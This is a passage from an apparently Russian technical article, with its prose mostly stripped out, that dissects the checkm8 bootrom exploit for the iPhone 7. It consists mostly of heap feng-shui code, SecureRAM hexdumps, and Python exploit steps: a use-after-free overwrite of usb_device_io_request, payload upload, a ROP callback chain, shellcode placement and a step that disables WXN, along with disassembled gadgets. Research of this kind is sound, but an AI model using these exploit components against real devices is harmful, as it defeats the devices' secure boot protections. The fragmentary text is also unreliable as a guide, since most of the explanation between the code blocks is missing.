    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<font></font>
    {<font></font>
       <span class="hljs-built_in">printf</span>(<span class="hljs-string">"descs[%d]  = %p\n"</span>, i, descs[i]);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"task = %p\n"</span>, task);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"task_stack = %p\n"</span>, task_stack);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"io_buf = %p\n"</span>, io_buf_1);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hs = %p\n"</span>, hs);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"fs = %p\n"</span>, fs);<font></font>
<font></font>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<font></font>
    {<font></font>
        io_req[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"io_req[%d] = %p\n"</span>, i, io_req[i]);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"**********\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"io_req_off = %#lx\n"</span>, (<span class="hljs-keyword">int64_t</span>)io_req[<span class="hljs-number">0</span>] - (<span class="hljs-keyword">int64_t</span>)io_buf_0);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hs_off  = %#lx\n"</span>, (<span class="hljs-keyword">int64_t</span>)hs - (<span class="hljs-keyword">int64_t</span>)io_buf_0);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"fs_off  = %#lx\n"</span>, (<span class="hljs-keyword">int64_t</span>)fs - (<span class="hljs-keyword">int64_t</span>)io_buf_0);<font></font>
<font></font>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<font></font>
}</code></pre></div></div><br>
<p>   8-    <code>heap feng-shui</code>:</p><br>
<pre><code class="plaintext hljs">chunk = 0x1004000<font></font>
descs[0]  = 0x1004480<font></font>
descs[1]  = 0x10045c0<font></font>
descs[2]  = 0x1004640<font></font>
descs[3]  = 0x10046c0<font></font>
descs[4]  = 0x1004800<font></font>
task = 0x1004880<font></font>
task_stack = 0x1004c80<font></font>
io_buf = 0x1008d00<font></font>
hs = 0x1009540<font></font>
fs = 0x10095c0<font></font>
zlps[0]  = 0x1009a40<font></font>
zlps[1]  = 0x1009640<font></font>
**********<font></font>
descs[0]  = 0x10096c0<font></font>
descs[1]  = 0x1009800<font></font>
descs[2]  = 0x1009880<font></font>
descs[3]  = 0x1009900<font></font>
descs[4]  = 0x1004480<font></font>
task = 0x1004500<font></font>
task_stack = 0x1004900<font></font>
io_buf = 0x1008980<font></font>
hs = 0x10091c0<font></font>
fs = 0x1009240<font></font>
io_req[0] = 0x10092c0<font></font>
io_req[1] = 0x1009340<font></font>
io_req[2] = 0x10093c0<font></font>
io_req[3] = 0x1009440<font></font>
io_req[4] = 0x10094c0<font></font>
**********<font></font>
io_req_off = 0x5c0<font></font>
hs_off  = 0x4c0<font></font>
fs_off  = 0x540</code></pre><br>
<p> <code>usb_device_io_request</code>    <code>0x5c0</code>    ,    :</p><br>
<pre><code class="python hljs">t8010_overwrite = <span class="hljs-string">'\0'</span> * <span class="hljs-number">0x5c0</span>
t8010_overwrite += struct.pack(<span class="hljs-string">'&lt;32x2Q'</span>, t8010_nop_gadget, callback_chain)</code></pre><br>
<p>      ,      <code>SecureRAM</code>,      <code>checkm8</code>.     ,       .    ,    <code>usb_device_io_request</code>     ,       .</p><br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python3</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">from</span> hexdump <span class="hljs-keyword">import</span> hexdump<font></font>
<font></font>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">'HEAP'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:<font></font>
    heap = f.read()<font></font>
<font></font>
cur = <span class="hljs-number">0x4000</span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_header</span>(<span class="hljs-params">cur</span>):</span>
    _, _, _, _, this_size, t = struct.unpack(<span class="hljs-string">'&lt;QQQQQQ'</span>, heap[cur:cur + <span class="hljs-number">0x30</span>])<font></font>
    is_free = t &amp; <span class="hljs-number">1</span>
    prev_free = (t &gt;&gt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">1</span>
    prev_size = t &gt;&gt; <span class="hljs-number">2</span>
    this_size *= <span class="hljs-number">0x40</span>
    prev_size *= <span class="hljs-number">0x40</span>
    <span class="hljs-keyword">return</span> this_size, is_free, prev_size, prev_free<font></font>
<font></font>
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    <span class="hljs-keyword">try</span>:<font></font>
        this_size, is_free, prev_size, prev_free = parse_header(cur)<font></font>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:
        <span class="hljs-keyword">break</span>
    print(<span class="hljs-string">'chunk at'</span>, hex(cur + <span class="hljs-number">0x40</span>))
    <span class="hljs-keyword">if</span> this_size == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">if</span> cur <span class="hljs-keyword">in</span> (<span class="hljs-number">0x9180</span>, <span class="hljs-number">0x9200</span>, <span class="hljs-number">0x9280</span>):  <span class="hljs-comment">#   </span>
            this_size = <span class="hljs-number">0x80</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">break</span>
    print(hex(this_size), <span class="hljs-string">'free'</span> <span class="hljs-keyword">if</span> is_free <span class="hljs-keyword">else</span> <span class="hljs-string">'non-free'</span>, hex(prev_size), prev_free)<font></font>
    hexdump(heap[cur + <span class="hljs-number">0x40</span>:cur + min(this_size, <span class="hljs-number">0x100</span>)])<font></font>
    cur += this_size</code></pre><br>
<p>        . ,        .</p><br>
<div class="spoiler"><b class="spoiler_title">    SecureRAM</b><div class="spoiler_text"><pre><code class="plaintext hljs">chunk at 0x4040<font></font>
0x40 non-free 0x0 0<font></font>
chunk at 0x4080<font></font>
0x80 non-free 0x40 0<font></font>
00000000: 00 41 1B 80 01 00 00 00  00 00 00 00 00 00 00 00  .A..............<font></font>
00000010: 00 00 00 00 00 00 00 00  00 01 00 00 00 00 00 00  ................<font></font>
00000020: FF 00 00 00 00 00 00 00  68 3F 08 80 01 00 00 00  ........h?......<font></font>
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................<font></font>
chunk at 0x4100<font></font>
0x140 non-free 0x80 0<font></font>
00000000: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
chunk at 0x4240<font></font>
0x240 non-free 0x140 0<font></font>
00000000: 68 6F 73 74 20 62 72 69  64 67 65 00 00 00 00 00  host bridge.....<font></font>
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
chunk at 0x4480  // descs[4], conf string<font></font>
0x80 non-free 0x240 0<font></font>
00000000: 3E 03 41 00 70 00 70 00  6C 00 65 00 20 00 4D 00  &gt;.A.p.p.l.e. .M.<font></font>
00000010: 6F 00 62 00 69 00 6C 00  65 00 20 00 44 00 65 00  o.b.i.l.e. .D.e.<font></font>
00000020: 76 00 69 00 63 00 65 00  20 00 28 00 44 00 46 00  v.i.c.e. .(.D.F.<font></font>
00000030: 55 00 20 00 4D 00 6F 00  64 00 65 00 29 00 FE FF  U. .M.o.d.e.)...<font></font>
chunk at 0x4500  // task<font></font>
0x400 non-free 0x80 0<font></font>
00000000: 6B 73 61 74 00 00 00 00  E0 01 08 80 01 00 00 00  ksat............<font></font>
00000010: E8 83 08 80 01 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000020: 00 00 00 00 00 00 00 00  02 00 00 00 00 00 00 00  ................<font></font>
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
chunk at 0x4900  // task stack<font></font>
0x4080 non-free 0x400 0<font></font>
00000000: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
00000010: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
00000020: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
00000030: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
00000040: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
00000050: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
00000060: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
00000070: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
00000080: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
00000090: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
000000A0: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
000000B0: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats<font></font>
chunk at 0x8980  // io_buf<font></font>
0x840 non-free 0x4080 0<font></font>
00000000: 63 6D 65 6D 63 6D 65 6D  00 00 00 00 00 00 00 00  cmemcmem........<font></font>
00000010: 10 00 0B 80 01 00 00 00  00 00 1B 80 01 00 00 00  ................<font></font>
00000020: EF FF 00 00 00 00 00 00  10 08 0B 80 01 00 00 00  ................<font></font>
00000030: 4C CC 00 00 01 00 00 00  20 08 0B 80 01 00 00 00  L....... .......<font></font>
00000040: 4C CC 00 00 01 00 00 00  30 08 0B 80 01 00 00 00  L.......0.......<font></font>
00000050: 4C CC 00 00 01 00 00 00  40 08 0B 80 01 00 00 00  L.......@.......<font></font>
00000060: 4C CC 00 00 01 00 00 00  A0 08 0B 80 01 00 00 00  L...............<font></font>
00000070: 00 06 0B 80 01 00 00 00  6C 04 00 00 01 00 00 00  ........l.......<font></font>
00000080: 00 00 00 00 00 00 00 00  78 04 00 00 01 00 00 00  ........x.......<font></font>
00000090: 00 00 00 00 00 00 00 00  B8 A4 00 00 01 00 00 00  ................<font></font>
000000A0: 00 00 0B 80 01 00 00 00  E4 03 00 00 01 00 00 00  ................<font></font>
000000B0: 00 00 00 00 00 00 00 00  34 04 00 00 01 00 00 00  ........4.......<font></font>
chunk at 0x91c0  // hs config<font></font>
0x80 non-free 0x0 0<font></font>
00000000: 09 02 19 00 01 01 05 80  FA 09 04 00 00 00 FE 01  ................<font></font>
00000010: 00 00 07 21 01 0A 00 00  08 00 00 00 00 00 00 00  ...!............<font></font>
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
chunk at 0x9240  // ls config<font></font>
0x80 non-free 0x0 0<font></font>
00000000: 09 02 19 00 01 01 05 80  FA 09 04 00 00 00 FE 01  ................<font></font>
00000010: 00 00 07 21 01 0A 00 00  08 00 00 00 00 00 00 00  ...!............<font></font>
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
chunk at 0x92c0<font></font>
0x80 non-free 0x0 0<font></font>
00000000: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000010: 01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000020: 6C CC 00 00 01 00 00 00  00 08 0B 80 01 00 00 00  l...............<font></font>
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................<font></font>
chunk at 0x9340<font></font>
0x80 non-free 0x80 0<font></font>
00000000: 80 00 00 00 00 00 00 00  00 89 08 80 01 00 00 00  ................<font></font>
00000010: FF FF FF FF C0 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000020: 48 DE 00 00 01 00 00 00  C0 93 1B 80 01 00 00 00  H...............<font></font>
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................<font></font>
chunk at 0x93c0<font></font>
0x80 non-free 0x80 0<font></font>
00000000: 80 00 00 00 00 00 00 00  00 89 08 80 01 00 00 00  ................<font></font>
00000010: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000020: 00 00 00 00 00 00 00 00  40 94 1B 80 01 00 00 00  ........@.......<font></font>
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................<font></font>
chunk at 0x9440<font></font>
0x80 non-free 0x80 0<font></font>
00000000: 80 00 00 00 00 00 00 00  00 89 08 80 01 00 00 00  ................<font></font>
00000010: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................<font></font>
chunk at 0x94c0<font></font>
0x180 non-free 0x80 0<font></font>
00000000: E4 03 43 00 50 00 49 00  44 00 3A 00 38 00 30 00  ..C.P.I.D.:.8.0.<font></font>
00000010: 31 00 30 00 20 00 43 00  50 00 52 00 56 00 3A 00  1.0. .C.P.R.V.:.<font></font>
00000020: 31 00 31 00 20 00 43 00  50 00 46 00 4D 00 3A 00  1.1. .C.P.F.M.:.<font></font>
00000030: 30 00 33 00 20 00 53 00  43 00 45 00 50 00 3A 00  0.3. .S.C.E.P.:.<font></font>
00000040: 30 00 31 00 20 00 42 00  44 00 49 00 44 00 3A 00  0.1. .B.D.I.D.:.<font></font>
00000050: 30 00 43 00 20 00 45 00  43 00 49 00 44 00 3A 00  0.C. .E.C.I.D.:.<font></font>
00000060: 30 00 30 00 31 00 41 00  34 00 30 00 33 00 36 00  0.0.1.A.4.0.3.6.<font></font>
00000070: 32 00 30 00 34 00 35 00  45 00 35 00 32 00 36 00  2.0.4.5.E.5.2.6.<font></font>
00000080: 20 00 49 00 42 00 46 00  4C 00 3A 00 33 00 43 00   .I.B.F.L.:.3.C.<font></font>
00000090: 20 00 53 00 52 00 54 00  47 00 3A 00 5B 00 69 00   .S.R.T.G.:.[.i.<font></font>
000000A0: 42 00 6F 00 6F 00 74 00  2D 00 32 00 36 00 39 00  B.o.o.t.-.2.6.9.<font></font>
000000B0: 36 00 2E 00 30 00 2E 00  30 00 2E 00 31 00 2E 00  6...0...0...1...<font></font>
chunk at 0x9640  // zlps[1]<font></font>
0x80 non-free 0x180 0<font></font>
00000000: 80 00 00 00 00 00 00 00  00 89 08 80 01 00 00 00  ................<font></font>
00000010: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................<font></font>
chunk at 0x96c0  // descs[0], Nonce<font></font>
0x140 non-free 0x80 0<font></font>
00000000: EA 03 20 00 4E 00 4F 00  4E 00 43 00 3A 00 35 00  .. .N.O.N.C.:.5.<font></font>
00000010: 35 00 46 00 38 00 43 00  41 00 39 00 37 00 41 00  5.F.8.C.A.9.7.A.<font></font>
00000020: 46 00 45 00 36 00 30 00  36 00 43 00 39 00 41 00  F.E.6.0.6.C.9.A.<font></font>
00000030: 41 00 31 00 31 00 32 00  44 00 38 00 42 00 37 00  A.1.1.2.D.8.B.7.<font></font>
00000040: 43 00 46 00 33 00 35 00  30 00 46 00 42 00 36 00  C.F.3.5.0.F.B.6.<font></font>
00000050: 35 00 37 00 36 00 43 00  41 00 41 00 44 00 30 00  5.7.6.C.A.A.D.0.<font></font>
00000060: 38 00 43 00 39 00 35 00  39 00 39 00 34 00 41 00  8.C.9.5.9.9.4.A.<font></font>
00000070: 46 00 32 00 34 00 42 00  43 00 38 00 44 00 32 00  F.2.4.B.C.8.D.2.<font></font>
00000080: 36 00 37 00 30 00 38 00  35 00 43 00 31 00 20 00  6.7.0.8.5.C.1. .<font></font>
00000090: 53 00 4E 00 4F 00 4E 00  3A 00 42 00 42 00 41 00  S.N.O.N.:.B.B.A.<font></font>
000000A0: 30 00 41 00 36 00 46 00  31 00 36 00 42 00 35 00  0.A.6.F.1.6.B.5.<font></font>
000000B0: 31 00 37 00 45 00 31 00  44 00 33 00 39 00 32 00  1.7.E.1.D.3.9.2.<font></font>
chunk at 0x9800  // descs[1], Manufacturer<font></font>
0x80 non-free 0x140 0<font></font>
00000000: 16 03 41 00 70 00 70 00  6C 00 65 00 20 00 49 00  ..A.p.p.l.e. .I.<font></font>
00000010: 6E 00 63 00 2E 00 D6 D7  D8 D9 DA DB DC DD DE DF  n.c.............<font></font>
00000020: E0 E1 E2 E3 E4 E5 E6 E7  E8 E9 EA EB EC ED EE EF  ................<font></font>
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................<font></font>
chunk at 0x9880  // descs[2], Product<font></font>
0x80 non-free 0x80 0<font></font>
00000000: 3E 03 41 00 70 00 70 00  6C 00 65 00 20 00 4D 00  &gt;.A.p.p.l.e. .M.<font></font>
00000010: 6F 00 62 00 69 00 6C 00  65 00 20 00 44 00 65 00  o.b.i.l.e. .D.e.<font></font>
00000020: 76 00 69 00 63 00 65 00  20 00 28 00 44 00 46 00  v.i.c.e. .(.D.F.<font></font>
00000030: 55 00 20 00 4D 00 6F 00  64 00 65 00 29 00 FE FF  U. .M.o.d.e.)...<font></font>
chunk at 0x9900  // descs[3], Serial number<font></font>
0x140 non-free 0x80 0<font></font>
00000000: C6 03 43 00 50 00 49 00  44 00 3A 00 38 00 30 00  ..C.P.I.D.:.8.0.<font></font>
00000010: 31 00 30 00 20 00 43 00  50 00 52 00 56 00 3A 00  1.0. .C.P.R.V.:.<font></font>
00000020: 31 00 31 00 20 00 43 00  50 00 46 00 4D 00 3A 00  1.1. .C.P.F.M.:.<font></font>
00000030: 30 00 33 00 20 00 53 00  43 00 45 00 50 00 3A 00  0.3. .S.C.E.P.:.<font></font>
00000040: 30 00 31 00 20 00 42 00  44 00 49 00 44 00 3A 00  0.1. .B.D.I.D.:.<font></font>
00000050: 30 00 43 00 20 00 45 00  43 00 49 00 44 00 3A 00  0.C. .E.C.I.D.:.<font></font>
00000060: 30 00 30 00 31 00 41 00  34 00 30 00 33 00 36 00  0.0.1.A.4.0.3.6.<font></font>
00000070: 32 00 30 00 34 00 35 00  45 00 35 00 32 00 36 00  2.0.4.5.E.5.2.6.<font></font>
00000080: 20 00 49 00 42 00 46 00  4C 00 3A 00 33 00 43 00   .I.B.F.L.:.3.C.<font></font>
00000090: 20 00 53 00 52 00 54 00  47 00 3A 00 5B 00 69 00   .S.R.T.G.:.[.i.<font></font>
000000A0: 42 00 6F 00 6F 00 74 00  2D 00 32 00 36 00 39 00  B.o.o.t.-.2.6.9.<font></font>
000000B0: 36 00 2E 00 30 00 2E 00  30 00 2E 00 31 00 2E 00  6...0...0...1...<font></font>
chunk at 0x9a40  // zlps[0]<font></font>
0x80 non-free 0x140 0<font></font>
00000000: 80 00 00 00 00 00 00 00  00 89 08 80 01 00 00 00  ................<font></font>
00000010: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000020: 00 00 00 00 00 00 00 00  40 96 1B 80 01 00 00 00  ........@.......<font></font>
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................<font></font>
chunk at 0x9ac0<font></font>
0x46540 free 0x80 0<font></font>
00000000: 00 00 00 00 00 00 00 00  F8 8F 08 80 01 00 00 00  ................<font></font>
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000060: 00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  ................<font></font>
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000080: 00 00 00 00 00 00 00 00  F8 8F 08 80 01 00 00 00  ................<font></font>
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</code></pre></div></div><br>
<p>    ,    <code>High Speed</code>  <code>Full Speed</code>,     <code>IO</code>-.          , ,  ,      .      ,     .</p><br>
<h2 id="2-allokaciya-i-osvobozhdenie-io-bufera-bez-ochistki-globalnogo-sostoyaniya">2.    IO-    </h2><br>
<pre><code class="python hljs">device = dfu.acquire_device()<font></font>
device.serial_number<font></font>
libusb1_async_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">'A'</span> * <span class="hljs-number">0x800</span>, <span class="hljs-number">0.0001</span>)<font></font>
libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<font></font>
dfu.release_device(device)</code></pre><br>
<p>     <code>OUT</code>-   .      ,   <code>io_buffer</code>      .    <code>DFU</code>    <code>DFU_CLR_STATUS</code>,      <code>DFU</code>.</p><br>
<h2 id="3-perezapis-usb_device_io_request-v-kuche-s-pomoschyu-use-after-free">3.  <code>usb_device_io_request</code>     <code>use-after-free</code></h2><br>
<pre><code class="python hljs">device = dfu.acquire_device()<font></font>
device.serial_number<font></font>
stall(device)<font></font>
leak(device)<font></font>
leak(device)<font></font>
libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, t8010_overwrite, <span class="hljs-number">50</span>)</code></pre><br>
<p>     <code>usb_device_io_request</code>        <code>t8010_overwrite</code>,       .</p><br>
<p> <code>t8010_nop_gadget</code>  <code>0x1800B0800</code>    <code>callback</code>  <code>next</code>  <code>usb_device_io_request</code>.</p><br>
<p><code>t8010_nop_gadget</code>      ,         ,       <code>LR</code>, -    <code>free</code>  <code>callback</code>-  <code>usb_core_complete_endpoint_io</code>.  ,        ,          .</p><br>
<pre><code class="plaintext hljs">bootrom:000000010000CC6C                 LDP             X29, X30, [SP,#0x10+var_s0] // restore fp, lr<font></font>
bootrom:000000010000CC70                 LDP             X20, X19, [SP+0x10+var_10],#0x20<font></font>
bootrom:000000010000CC74                 RET</code></pre><br>
<p><code>next</code>   <code>INSECURE_MEMORY + 0x800</code>.  <code>INSECURE_MEMORY</code>     ,    <code>0x800</code>    <code>callback-chain</code>,     .</p><br>
<h2 id="4-razmeschenie-poleznoy-nagruzki">4.   </h2><br>
<pre><code class="python hljs"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(payload), <span class="hljs-number">0x800</span>):<font></font>
    libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<font></font>
                                   payload[i:i+<span class="hljs-number">0x800</span>], <span class="hljs-number">50</span>)</code></pre><br>
<p>           .      :</p><br>
<pre><code class="plaintext hljs">0x1800B0000: t8010_shellcode  #  shell-code<font></font>
...<font></font>
0x1800B0180: t8010_handler  #   usb-<font></font>
...<font></font>
0x1800B0400: 0x1000006a5  #    <font></font>
                          #  SecureROM (0x100000000 -&gt; 0x100000000)<font></font>
                          #       <font></font>
...<font></font>
0x1800B0600: 0x60000180000625  #    <font></font>
                               #  SecureRAM (0x180000000 -&gt; 0x180000000)<font></font>
                               #       <font></font>
0x1800B0608: 0x1800006a5  #    <font></font>
                          #    0x182000000  0x180000000<font></font>
                          #          <font></font>
0x1800B0610: disabe_wxn_arm64  #    WXN<font></font>
0x1800B0800: usb_rop_callbacks  # callback-chain</code></pre><br>
<h2 id="5-ispolnenie-callback-chain">5.  <code>callback-chain</code></h2><br>
<pre><code class="python hljs">dfu.usb_reset(device)<font></font>
dfu.release_device(device)</code></pre><br>
<p>  <code>USB</code>     <code>usb_device_io_request</code>        .        ,       <code>callback</code>.       :</p><br>
<pre><code class="plaintext hljs">bootrom:000000010000CC4C                 LDP             X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address<font></font>
bootrom:000000010000CC50                 LSL             W2, W2, W9<font></font>
bootrom:000000010000CC54                 MOV             X0, X8 ; arg0<font></font>
bootrom:000000010000CC58                 BLR             X10 ; call<font></font>
bootrom:000000010000CC5C                 CMP             W0, #0<font></font>
bootrom:000000010000CC60                 CSEL            W0, W0, W19, LT<font></font>
bootrom:000000010000CC64                 B               loc_10000CC6C<font></font>
bootrom:000000010000CC68 ; ---------------------------------------------------------------------------<font></font>
bootrom:000000010000CC68<font></font>
bootrom:000000010000CC68 loc_10000CC68                           ; CODE XREF: sub_10000CC1C+18↑j<font></font>
bootrom:000000010000CC68                 MOV             W0, #0<font></font>
bootrom:000000010000CC6C<font></font>
bootrom:000000010000CC6C loc_10000CC6C                           ; CODE XREF: sub_10000CC1C+48↑j<font></font>
bootrom:000000010000CC6C                 LDP             X29, X30, [SP,#0x10+var_s0]<font></font>
bootrom:000000010000CC70                 LDP             X20, X19, [SP+0x10+var_10],#0x20<font></font>
bootrom:000000010000CC74                 RET</code></pre><br>
<p> ,   <code>0x70</code>            .          <code>f(x)</code>   <code>f</code>  <code>x</code>.</p><br>
<p>     ,  <code>Unicorn Engine</code>.          <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">uEmu</a>.</p><br>
<p><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br>
<p>     <code>iPhone 7</code>    .</p><br>
<h4 id="51-dc_civac-0x1800b0600">5.1. <code>dc_civac 0x1800B0600</code></h4><br>
<pre><code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0<font></font>
0000000100000470: RET</code></pre><br>
<p>       .    ,          .</p><br>
<h4 id="52-dmb">5.2. <code>dmb</code></h4><br>
